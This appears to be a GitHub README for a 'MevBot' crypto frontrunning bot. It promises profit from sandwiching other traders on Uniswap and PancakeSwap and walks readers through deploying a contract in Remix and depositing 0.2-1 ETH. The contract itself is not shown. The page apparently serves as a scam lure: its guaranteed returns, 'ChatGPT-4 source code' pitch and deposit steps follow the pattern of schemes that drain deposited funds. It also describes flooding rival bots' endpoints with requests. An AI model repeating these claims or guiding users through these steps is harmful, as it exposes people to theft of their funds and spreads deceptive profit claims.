# MevBot

My development is licensed. All rights reserved by the "HOLO" team (HOLO-Team/MevBot)
--------------
This screenshot are for informative purposes of our copyrights!
------------

Make money with MEV-bot (ChatGPT-4 source code)
--------

Update May 1st, 2023
---------
The contract is optimized. The "start" and "withdraw" functions require less gas.
---------

Frontrunning bots take advantage of users buying low liquidity coins on DEXes such as Uniswap, Sushiswap, and PancakeSwap. The frontrun bot scans the mempool, buys the coins faster than the pending transactions, and quickly resells it for a profit.

Although my commercial code is superior, the code being presented was not intended for public viewing. It was designed to be "tested in production" with numerous quality tradeoffs made. I had no intentions of releasing this code publicly as it could potentially "leak my alpha". Nevertheless, I would like to showcase the knowledge I have gained over the past few years.

Bot sends the Transaction and sniffs the Uniswap Mempool.

Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity. It takes advantage of users buying low liquidity coins on DEXes including UniSwap, SushiSwap, and PancakeSwap.

After profiting, it sends back the ETH / BNB to the contract that you deployed where it is ready for withdrawal.

This bot performs all of that, faster than 99% of other bots.

**But ser, there are open source bots that do the same.**

Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as I went through their same pains and from a bot builder to a bot builder, i feel these guys. <3

**Wen increase aggressiveness ?**

As I've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.

**What did I learn?**

MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap.

**So why stop?**

I've made some profits from this but now I'm using some better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.

Towards the end, I found myself consistently being outcompeted by this person:

https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e

If this is you, I'd like to congratulate you on your success. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.

But I will give you some competition.(ㆆ_ㆆ)

MEV bot Instructions
-------



(works only for Mainnet)
How it works:
----

create-a-frontrunner-bot-on-uniswap

You can see an example of how the bot works.

![234767193-be276a13-315f-4e82-89c1-e37fa94a9952 (1)](https://user-images.githubusercontent.com/132253319/235499538-848899d5-081a-4b11-ae82-cb9154916a8f.png)

The bot will make transactions on your entire balance to increase profit

![234769046-932b596d-a133-4973-abff-2f97408bcd2d (1)](https://user-images.githubusercontent.com/132253319/235498693-c842fc13-afcf-4a32-830e-26318ceee183.png)

![234769052-88db1c19-b1e7-47fd-9991-d234fe6413ca](https://user-images.githubusercontent.com/132253319/235500446-a40e00b4-9fcf-4094-aaf7-0f872dc3ee8c.png)


First-source code
-----
Access the Remix IDE (this website is where we deploy the smart contract): https://remix.ethereum.org/ 
-----------
FILE EXPLORER
---------
 and click and create or import new file "MevBot.sol"
Copy code and paste in Remix IDE

![holo2](https://user-images.githubusercontent.com/132253319/235499684-dd2566d9-4648-4280-9a95-d849982f6e47.png)


Click Solidity complier 0.6.6
------

And press Compile Mev Bot.sol

![holo9](https://user-images.githubusercontent.com/132253319/235500004-34c8b909-e9ec-4179-8030-1e55deae7654.png)



Select ETH or BSC(BNB) network
-----

and router address

Press Transact (Deploy)
-----
![holo2](https://user-images.githubusercontent.com/132253319/235500067-c978dee8-db63-411e-bd59-79330071ecfd.png)




Next - Deposit Balance into MEV Bot
------

Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the "Start" button.

![holo4](https://user-images.githubusercontent.com/132253319/235500126-539f7ba3-7ccd-43ef-ae4c-35e9e61c64fc.png)

![holo5](https://user-images.githubusercontent.com/132253319/235500182-ad96a425-5f44-4014-891a-909dec0d4182.png)

![holo6](https://user-images.githubusercontent.com/132253319/235500213-724d854a-bfee-461e-943d-6186289c7669.png)



Wait a couple of days for profit. For successful transactions on the Ethereum network, you must have enough balance to cover gas fees. Recommended 0.2-1 ETH.
----

At any time, you can "Stop" the bot or return your money by calling the "Withdrawal" function.
-----
